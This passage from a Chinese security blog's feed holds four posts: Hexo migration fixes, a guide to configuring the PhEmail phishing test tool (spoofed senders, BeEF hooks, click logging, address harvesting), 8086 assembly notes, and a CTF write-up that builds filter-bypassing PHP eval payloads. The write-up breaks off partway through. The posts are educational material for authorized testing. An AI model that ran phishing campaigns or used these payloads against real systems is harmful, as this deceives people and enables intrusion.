(&#x2F;Users&#x2F;yourname&#x2F;hexo&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promise.js:693:18)</span><br><span class="line">    at Promise._fulfill (&#x2F;Users&#x2F;yourname&#x2F;hexo&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promise.js:638:18)</span><br><span class="line">    at Promise._resolveCallback (&#x2F;Users&#x2F;yourname&#x2F;hexo&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promise.js:432:57)</span><br><span class="line">    at Promise._settlePromiseFromHandler (&#x2F;Users&#x2F;yourname&#x2F;hexo&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promise.js:524:17)</span><br><span class="line">    at Promise._settlePromise (&#x2F;Users&#x2F;yourname&#x2F;hexo&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promise.js:569:18)</span><br><span class="line">    at Promise._settlePromise0 (&#x2F;Users&#x2F;yourname&#x2F;hexo&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promise.js:614:10)</span><br><span class="line">    at Promise._settlePromises (&#x2F;Users&#x2F;yourname&#x2F;hexo&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promise.js:693:18)</span><br><span class="line">    at Promise._fulfill (&#x2F;Users&#x2F;yourname&#x2F;hexo&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promise.js:638:18)</span><br><span class="line">    at Promise._resolveCallback (&#x2F;Users&#x2F;yourname&#x2F;hexo&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promise.js:432:57)</span><br><span class="line">    at Promise._settlePromiseFromHandler (&#x2F;Users&#x2F;yourname&#x2F;hexo&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promise.js:524:17)</span><br><span class="line">    at Promise._settlePromise (&#x2F;Users&#x2F;yourname&#x2F;hexo&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promise.js:569:18)</span><br><span class="line">    at Promise._settlePromise0 (&#x2F;Users&#x2F;yourname&#x2F;hexo&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promise.js:614:10)</span><br><span class="line">    at Promise._settlePromises (&#x2F;Users&#x2F;yourname&#x2F;hexo&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promise.js:693:18)</span><br><span class="line">    at Promise._fulfill (&#x2F;Users&#x2F;yourname&#x2F;hexo&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promise.js:638:18)</span><br></pre></td></tr></table></figure>

<p>Google后发现是因为node版本过高，卸载最新版node14.9，安装node12.18.3</p>
<ul>
<li>若报如下错误</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git@github.com: Permission denied (publickey).</span><br><span class="line">fatal: 无法读取远程仓库。</span><br><span class="line"></span><br><span class="line">请确认您有正确的访问权限并且仓库存在。</span><br><span class="line">FATAL Something&#39;s wrong. Maybe you can find the solution here: http:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;troubleshooting.html</span><br><span class="line">Error: git@github.com: Permission denied (publickey).</span><br><span class="line">fatal: 无法读取远程仓库。</span><br></pre></td></tr></table></figure>

<p>采取如下措施</p>
<p>需要将 <code>文章</code> 与 <code>.deploy_git</code> 清干净。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">sudo rm -rf .deploy_git</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/white_idiot/article/details/80685990">【GitHub】创建Git分支将Hexo博客迁移到其它电脑
</a></p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>博客迁移</tag>
      </tags>
  </entry>
  <entry>
    <title>PhEmail:邮件钓鱼测试工具实际使用踩过的坑</title>
    <url>/2018/08/15/PhEmail-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/</url>
    <content><![CDATA[<h2 id="PhEmail简介"><a href="#PhEmail简介" class="headerlink" title="PhEmail简介"></a>PhEmail简介</h2><p>PhEmail是基于python编写的一款网络钓鱼邮件测试工具。PhEmail可以同时向多个用户发送钓鱼邮件，并记录点击的用户的邮箱和IP等信息。PhEmail可以通过Google收集邮箱，完成邮箱收集工作。该工具可以用于公司内部邮箱钓鱼测试，可结合beef使用。</p>
<p><strong>PhEmail项目主页：</strong><br><a href="https://github.com/Dionach/PhEmail">PhEmail钓鱼邮件工具</a></p>
<a id="more"></a>

<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="PhEmail帮助"><a href="#PhEmail帮助" class="headerlink" title="PhEmail帮助"></a>PhEmail帮助</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PHishing EMAIL tool v0<span class="number">.13</span></span><br><span class="line">Usage: phemail.py [-e &lt;emails&gt;] [-m &lt;mail_server&gt;] [-f &lt;from_address&gt;] [-r &lt;replay_address&gt;] [-s &lt;subject&gt;] [-b &lt;body&gt;]</span><br><span class="line">          -e    emails: File containing list of emails (Default: emails.txt)</span><br><span class="line">          -f    from_address: Source email address displayed <span class="keyword">in</span> FROM field of the email (Default: Name Surname &lt;name_surname@example.com&gt;)</span><br><span class="line">          -r    reply_address: Actual email address used to send the emails <span class="keyword">in</span> case that people reply to the email (Default: Name Surname &lt;name_surname@example.com&gt;)</span><br><span class="line">          -s    subject: Subject of the email (Default: Newsletter)</span><br><span class="line">          -b    body: Body of the email (Default: body.txt)</span><br><span class="line">          -p    pages: Specifies number of results pages searched (Default: <span class="number">10</span> pages)</span><br><span class="line">          -v    verbose: Verbose Mode (Default: false)</span><br><span class="line">          -l    layout: Send email <span class="keyword">with</span> no embedded pictures</span><br><span class="line">          -B    BeEF: Add the hook <span class="keyword">for</span> BeEF</span><br><span class="line">          -m    mail_server: SMTP mail server to connect to</span><br><span class="line">          -g    Google: Use a google account username:password</span><br><span class="line">          -t    Time delay: Add deleay between each email (Default: <span class="number">3</span> sec)</span><br><span class="line">          -L    webserverLog: Customise the name of the webserver log file (Default: Date time <span class="keyword">in</span> format <span class="string">&quot;%d_%m_%Y_%H_%M&quot;</span>)</span><br><span class="line">          -S    Search: query on Google</span><br><span class="line">          -d    domain: of email addresses</span><br><span class="line">          -n    number: of emails per connection (Default: <span class="number">10</span> emails)</span><br><span class="line">          -c    clone: Clone a web page</span><br><span class="line">          -w    website: where the phishing email link points to</span><br><span class="line">          -o    save output <span class="keyword">in</span> a file</span><br><span class="line">          -F    Format (Default: <span class="number">0</span>):</span><br><span class="line">                <span class="number">0</span>- firstname surname</span><br><span class="line">                <span class="number">1</span>- firstname.surname@example.com</span><br><span class="line">                <span class="number">2</span>- firstnamesurname@example.com</span><br><span class="line">                <span class="number">3</span>- f.surname@example.com</span><br><span class="line">                <span class="number">4</span>- firstname.s@example.com</span><br><span class="line">                <span class="number">5</span>- surname.firstname@example.com</span><br><span class="line">                <span class="number">6</span>- s.firstname@example.com</span><br><span class="line">                <span class="number">7</span>- surname.f@example.com</span><br><span class="line">                <span class="number">8</span>- surnamefirstname@example.com</span><br><span class="line">                <span class="number">9</span>- firstname_surname@example.com</span><br><span class="line"></span><br><span class="line">Examples: phemail.py -e emails.txt -f <span class="string">&quot;Name Surname &lt;name_surname@example.com&gt;&quot;</span> -r <span class="string">&quot;Name Surname &lt;name_surname@example.com&gt;&quot;</span> -s <span class="string">&quot;Subject&quot;</span> -b body.txt</span><br><span class="line">          phemail.py -S example -d example.com -F <span class="number">1</span> -p <span class="number">12</span></span><br><span class="line">          phemail.py -c https://example.com</span><br></pre></td></tr></table></figure>
<p>收集邮箱后钓鱼邮件发送常用参数：</p>
<ul>
<li>-e 收件人邮箱列表（列表内邮箱必须为同一域名）</li>
<li>-f 发件人邮箱地址（伪造的邮箱不能与收件人邮箱在同一域名下）</li>
<li>-r 收件人回复邮件时的接收邮箱，可采用临时邮箱</li>
<li>-s 伪造的邮件主题</li>
<li>-b 伪造的邮件内容文件，采用html编码，模板中采用href=”{0}”来代替url地址</li>
<li>-w 钓鱼网站url地址，发送后会自动添加index.php?email=等内容</li>
</ul>
<h3 id="记录邮箱的方式"><a href="#记录邮箱的方式" class="headerlink" title="记录邮箱的方式"></a>记录邮箱的方式</h3><p>钓鱼邮件中的url链接伪造时添加email地址并进行编码，通过钓鱼网站中php文件代码来识别email并记录log文件中。php可以进行重定向到其他网站。</p>
<h2 id="实际使用需要修改的地方"><a href="#实际使用需要修改的地方" class="headerlink" title="实际使用需要修改的地方"></a>实际使用需要修改的地方</h2><h3 id="BeautifulSoup问题"><a href="#BeautifulSoup问题" class="headerlink" title="BeautifulSoup问题"></a>BeautifulSoup问题</h3><p>安装BeautifulSoup后，运行程序时会报BeautifulSoup问题。</p>
<ol>
<li>可以将源代码中如下位置的注释切换<br><img src="/2018/08/15/PhEmail-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/beautifulsoup4.PNG"><br>修改为如下：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> BeautifulSoup <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">    <span class="comment">#from bs4 import BeautifulSoup</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;No BeautifulSoup installed&quot;</span></span><br></pre></td></tr></table></figure></li>
<li>不修改注释，将所有调用BeautufulSoup的函数的<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">html = BeautifulSoup(xxx)</span><br></pre></td></tr></table></figure>
修改为：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">html = BeautifulSoup(xxx,<span class="string">&#x27;lxml&#x27;</span>)</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="中文乱码"><a href="#中文乱码" class="headerlink" title="中文乱码"></a>中文乱码</h3><p>邮件在使用中文时出现中文乱码，需要修改phemail.py内容进行调整。</p>
<h4 id="邮件标题乱码"><a href="#邮件标题乱码" class="headerlink" title="邮件标题乱码"></a>邮件标题乱码</h4><p>在导入包时添加如下内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;utf8&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>对邮件标题进行unicode编码，在发送邮件时添加如下代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> isinstance(SUBJECT):</span><br><span class="line">      SUBJECT = unicode(SUBJECT,unicode)</span><br><span class="line">msg[<span class="string">&#x27;subject&#x27;</span>] = SUBJECT</span><br></pre></td></tr></table></figure>
<h4 id="邮件内容乱码"><a href="#邮件内容乱码" class="headerlink" title="邮件内容乱码"></a>邮件内容乱码</h4><p>添加如下代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msg[<span class="string">&quot;Accept-Language&quot;</span>]=<span class="string">&quot;zh-CN&quot;</span></span><br><span class="line">msg[<span class="string">&quot;Accept-Charset&quot;</span>]=<span class="string">&quot;ISO-8859-1,utf-8&quot;</span></span><br></pre></td></tr></table></figure>
<p>并将</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msgAlt.attach(MIMEText(body.format(url),<span class="string">&#x27;html&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>修改为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msgAlt.attach(MIMEText(body.format(url),<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h3 id="index-php内容修改"><a href="#index-php内容修改" class="headerlink" title="index.php内容修改"></a>index.php内容修改</h3><h4 id="修改域名"><a href="#修改域名" class="headerlink" title="修改域名"></a>修改域名</h4><p>修改位置在index.php中有提示：<br><img src="/2018/08/15/PhEmail-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/change_domain.PNG"><br>将其中的dionach.com修改为收件人邮箱的域名。</p>
<h4 id="修改重定向"><a href="#修改重定向" class="headerlink" title="修改重定向"></a>修改重定向</h4><p>在index.php末尾存在重定向方法，可以将此url改为你想要重定向的url，如<a href="http://www.baidu.com/">www.baidu.com</a><br><img src="/2018/08/15/PhEmail-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/%E9%87%8D%E5%AE%9A%E5%90%91.PNG"></p>
<h4 id="修改记录log文件保存位置"><a href="#修改记录log文件保存位置" class="headerlink" title="修改记录log文件保存位置"></a>修改记录log文件保存位置</h4><p>index.php中将log文件保存在/tmp目录中，若使用windows搭建网站服务，则不存在/tmp目录,直接将log文件保存在当前目录，删除下面代码中的”/tmp/“<br><img src="/2018/08/15/PhEmail-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/log%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE.PNG"></p>
<h2 id="整理log日志"><a href="#整理log日志" class="headerlink" title="整理log日志"></a>整理log日志</h2><p>若收件人点击后php获取了如下一系列信息：<br><img src="/2018/08/15/PhEmail-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/log%E4%BF%A1%E6%81%AF.PNG"><br>若存在多个文件，并想提取其中的email地址，并去重，于是写了一个小脚本进行提取email去重：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- conding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">regex = <span class="string">r&quot;([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)&quot;</span></span><br><span class="line"></span><br><span class="line">filepth = sys.argv[<span class="number">1</span>]</span><br><span class="line">file = os.listdir(filepth)</span><br><span class="line">allinemail = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> file:</span><br><span class="line">    <span class="keyword">with</span> open(filepth+filename,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        emails = re.findall(regex,f.read())</span><br><span class="line">        allemail = list(set(emails))</span><br><span class="line">        <span class="keyword">for</span> e <span class="keyword">in</span> allemail:</span><br><span class="line">            <span class="keyword">if</span> e <span class="keyword">not</span> <span class="keyword">in</span> allinemail:</span><br><span class="line">                allinemail.append(e)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;email_result.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> w:</span><br><span class="line">    <span class="keyword">for</span> email <span class="keyword">in</span> allinemail:</span><br><span class="line">        w.write(email+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">w.close()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>PhEmail</tag>
        <tag>邮件钓鱼</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编指令</title>
    <url>/2018/09/05/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="数据定义"><a href="#数据定义" class="headerlink" title="数据定义"></a>数据定义</h2><p>db定义字节类型变量，一个字节数据占1个字节（8位）单元，读完一个，偏移量加1<br>dw定义字类型变量，一个字数据占2个字节（16位）单元，读完一个，偏移量加2<br>dd定义双字类型变量，一个双字数据占4个字节（32位）单元，读完一个，偏移量加4<br>dup操作符用来进行数据的重复：<br>db 重复的次数 dup (重复的字节型数据)。<br>dw 重复的次数 dup (重复的字型数据)。<br>dd 重复的次数 dup (重复的双字数据)。</p>
<a id="more"></a>
<h2 id="寄存器相关"><a href="#寄存器相关" class="headerlink" title="寄存器相关"></a>寄存器相关</h2><h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><p>8086CPU的AX、BX、CX、DX四个16位寄存器都可分为两个独立使用的8位寄存器来用：</p>
<ul>
<li>AX可分为AH和AL</li>
<li>BX可分为BH和BL</li>
<li>CX可分为CH和CL</li>
<li>DX可分为DH和DL</li>
</ul>
<table>
<thead>
<tr>
<th>汇编指令</th>
<th>功能</th>
<th>高级语言描述</th>
</tr>
</thead>
<tbody><tr>
<td>mov ax,18</td>
<td>将18送入寄存器ax</td>
<td>ax=18</td>
</tr>
<tr>
<td>add ax,8</td>
<td>将寄存器ax中的值加8</td>
<td>ax=ax+8</td>
</tr>
<tr>
<td>sub ax,8</td>
<td>将寄存器ax中的值减8</td>
<td>ax=ax-8</td>
</tr>
<tr>
<td>inc ax</td>
<td>将寄存器ax中的值加1</td>
<td>ax=ax+1</td>
</tr>
</tbody></table>
<h3 id="段寄存器-amp-指令指针寄存器"><a href="#段寄存器-amp-指令指针寄存器" class="headerlink" title="段寄存器&amp;指令指针寄存器"></a>段寄存器&amp;指令指针寄存器</h3><p>8086CPU有4个段寄存器：CS、DS、SS、ES。访问内存时由4个段寄存器提供内存单元的段地址。<br>IP为指令指针寄存器，任意时刻，CPU将CS:IP指向的内容当作指令执行。<br>CS值*16+IP值</p>
<p>jmp指令同时修改CS、IP的内容：<br>jmp 2AE3:3,执行后：CS=2AE3H，IP=0003H，CPU从2AE33H处读取指令<br>jmp指令仅仅修改IP的内容：<br>jmp ax,执行前：ax=1000H，CS=2AE3H，IP=0003H<br>       执行后：ax=1000H，CS=2AE3H，IP=1000H</p>
<h3 id="DS-amp-address"><a href="#DS-amp-address" class="headerlink" title="DS&amp;[address]"></a>DS&amp;[address]</h3><p>DS存放要访问数据的段地址，[address]中address表示偏移地址。<br>| 汇编指令     | 执行后相关寄存器中内容 | 说明                                |<br>| ———— | ———————- | ———————————– |<br>| mov ax,1000H | ax=1000H               |                                     |<br>| mov ds,ax    | ds=1000H               | 寄存器ds设为1000H                   |<br>| mov ax,[0]   |                        | 将1000H:0中存放的字型数据存放到ax中 |</p>
<h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>SS段寄存器存放栈顶地址，SP寄存器存放偏移地址。任意时刻，SS:SP都指向栈顶元素。<br>push ax时，SP-2，SS:SP指向栈顶。pop ax时，SP+2，SS:SP指向栈顶。</p>
<h2 id="and和or指令"><a href="#and和or指令" class="headerlink" title="and和or指令"></a>and和or指令</h2><p>and指令：逻辑与指令，按位进行与运算。<br>or指令：逻辑或指令，按位进行或运算。</p>
<h2 id="div指令"><a href="#div指令" class="headerlink" title="div指令"></a>div指令</h2><p>除法指令：</p>
<ol>
<li>除数：有8位和16位两种，在一个寄存器或内存单元中</li>
<li>被除数：默认放在AX或DX和AX中，若除数为8位，则被除数16位，存放AX中；若除数为16位，被除数为32位，存放DX和AX中，DX存放高位，AX存放低位。</li>
<li>结果：若除数为8位，则AL存放除法操作的商，AH存放除法操作的余数。若为16位，则AX存放商，DX存放余数。</li>
</ol>
<p>例子：<br>div byte ptr ds:[0]<br>含义：(al)=(ax)/((ds)*16+0)的商<br>      (ah)=(ax)/((ds)*16+0)的余数</p>
<p>div word ptr es:[0]<br>含义：(ax)=[(dx)*10000H+(ax)]/((es)*16+0)的商<br>     (dx)=[(dx)*10000H+(ax)]/((es)*16+0)的余数</p>
<h2 id="mul指令"><a href="#mul指令" class="headerlink" title="mul指令"></a>mul指令</h2><p>乘法指令：</p>
<ol>
<li>两个相乘的数，要么都是8位，要么都是16位。若为8位，一个默认放在AH中，另一个放在8位寄存器或内存字节单元中；若为16位，一个默认放在AX中，另一个放在16位寄存器或内存字节单元中。</li>
<li>结果：若是8位乘法，结果默认放在AX中；若是16位，结果高位默认放在DX中，低位在AX中。</li>
</ol>
<h2 id="转移指令"><a href="#转移指令" class="headerlink" title="转移指令"></a>转移指令</h2><h3 id="操作符offset"><a href="#操作符offset" class="headerlink" title="操作符offset"></a>操作符offset</h3><p>offset：取得标号的偏移地址<br>mov ax,offset start相当与mov ax,0;start为代码段中的标号，所标记的指令为代码中的第一条指令，偏移地址为0。</p>
<h3 id="jmp指令"><a href="#jmp指令" class="headerlink" title="jmp指令"></a>jmp指令</h3><p>jmp为无条件转移指令。可以只修改IP，也可同时修改CS和IP。<br>jmp short 标号（转到标号处执行指令）<br>“jmp short 标号”功能：(IP)=(IP)+8位位移。<br>“jmp near ptr 标号”功能：(IP)=(IP)+16。<br>“jmp far ptr 标号”实现段间转移，又称远转移。功能：(CS)=标号所在段的段地址；(IP)=标号在段中的偏移地址。</p>
<h3 id="Jxx"><a href="#Jxx" class="headerlink" title="Jxx"></a>Jxx</h3><p>功能: 当特定条件成立则跳往指定地址执行<br>语法: JXX 地址<br>注:<br>A: ABOVE,当C=0,Z=0时成立<br>B: BELOW,当C=1时成立<br>C: CARRY,当弁时成立 CXZ: CX寄存器的值为0(ZERO)时成立<br>E: EQUAL,当Z=1时成立<br>G: GREATER(大于),当Z=0且S=0时成立<br>L: LESS(小于),当S不为零时成立<br>N: NOT(相反条件),需和其它符号配合使用<br>O: OVERFLOW,O=1时成立<br>P: PARITY,P=1时成立<br>PE: PARITY EVEN,P=1时成立<br>PO: PARITY ODD,P=0时成立<br>S: SIGN,S=1时成立<br>Z: ZERO,Z=1时成立<br>jcxz：有条件转移指令且为短转移，指令格式：jcxz 标号（如果(cx)=0，转移到标号处执行）。当(cx)!=0时，什么都不做（程序向下执行）。<br>“jcxz 标号”功能相当于if((cx)==0)jmp short 标号；</p>
<h3 id="loop指令"><a href="#loop指令" class="headerlink" title="loop指令"></a>loop指令</h3><p>loop为循环控制指令，loop指令格式：loop 标号；CPU执行loop指令时，进行两步操作：</p>
<ol>
<li>cx值=cx值-1；</li>
<li>判断cx中的值，不为0则跳转至标号处执行程序，如果为0则向下执行。</li>
</ol>
<h3 id="ret和retf"><a href="#ret和retf" class="headerlink" title="ret和retf"></a>ret和retf</h3><p>ret指令用栈中数据修改IP的内容，从而实现近转移，相当与pop IP。<br>retf指令用栈中数据修改CS和IP的内容，从而实现远转移，相当于pop IP后在pop CS。</p>
<h3 id="call指令"><a href="#call指令" class="headerlink" title="call指令"></a>call指令</h3><p>call指令进行两步操作：</p>
<ol>
<li>将当前的IP或CS和IP压入栈中；</li>
<li>转移。<br>call指令不能实现短转移。执行call相当于执行：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp near ptr 标号</span><br></pre></td></tr></table></figure>
转移的目的地址在指令中的call指令，”call far ptr 标号”实现段间转移，相当于：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push CS</span><br><span class="line">push IP</span><br><span class="line">jmp far ptr 标号</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h2><p><a href="https://blog.csdn.net/qq_33733970/article/details/78572733">常用的汇编指令</a></p>
<h2 id="指令大全"><a href="#指令大全" class="headerlink" title="指令大全"></a>指令大全</h2><p><img src="/2018/09/05/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%A4%A7%E5%85%A8.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF一道web题小结-无数字字母getFlag()</title>
    <url>/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/</url>
    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近遇到个CTF题目，分析后涨了波知识，题目如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>分析代码，了解到我们需要满足两个条件：</p>
<ol>
<li>长度不能大于35</li>
<li>不能存在数字字母_和$符号</li>
</ol>
<h2 id="0x02-无数字字母构造payload"><a href="#0x02-无数字字母构造payload" class="headerlink" title="0x02 无数字字母构造payload"></a>0x02 无数字字母构造payload</h2><p>首先，看到不能存在字母数字就想到了phithon师傅的文章里关于无字母数字webshell提到的3种方法提供了两种思路：</p>
<ol>
<li>利用位运算</li>
<li>利用自增运算符<br>想到payload应该是code=getFlag(),于是开始构造getFlag()。<br>在网上找到一个payload如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;$_();</span><br></pre></td></tr></table></figure>
分析：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">采用异或运算</span><br><span class="line">&#123; ^ %1c &#x3D; g</span><br><span class="line">&#123; ^ %1e &#x3D; e</span><br><span class="line">&#123; ^ %0f &#x3D; t</span><br><span class="line">&#123; ^ %3d &#x3D; F</span><br><span class="line">&#123; ^ %17 &#x3D; l</span><br><span class="line">&#123; ^ %1a &#x3D; a</span><br><span class="line">所以&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot; &#x3D; getFlag</span><br><span class="line">$_&#x3D;getFlag将_赋值为getFlag，最终得到getFlag()。</span><br></pre></td></tr></table></figure>
还有个payload为<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;~%98%9A%8B%B9%93%9E%98;$_();</span><br></pre></td></tr></table></figure>
直接取反getFlag再url编码。<br>其中_可以使用汉字代替，如<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$啊&#x3D;~%98%9A%8B%B9%93%9E%98;$啊();</span><br></pre></td></tr></table></figure>
当不过滤<strong>$</strong>符号时,可以这样操作，但是<strong>$</strong>符号过滤了，参考p牛的《无字母数字webshell之提高篇》中讲到PHP7是允许使用($a)()来执行动态函数;<br>此时，测试使用phpinfo();payload如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
使用php5进行测试时如下：<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/php5%E6%B5%8B%E8%AF%95phpinfo.PNG"></li>
</ol>
<p>获取phpinfo信息失败。</p>
<p>使用php7进行测试时如下：<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/php7%E6%B5%8B%E8%AF%95phpinfo.PNG"></p>
<p>获取phpinfo信息成功。</p>
<h2 id="0x03-解题思路"><a href="#0x03-解题思路" class="headerlink" title="0x03 解题思路"></a>0x03 解题思路</h2><p>利用通配符调用Linux系统命令 来查看flag。<br>在Linux系统中可以使用? * 等字符来正则匹配字母：</p>
<ul>
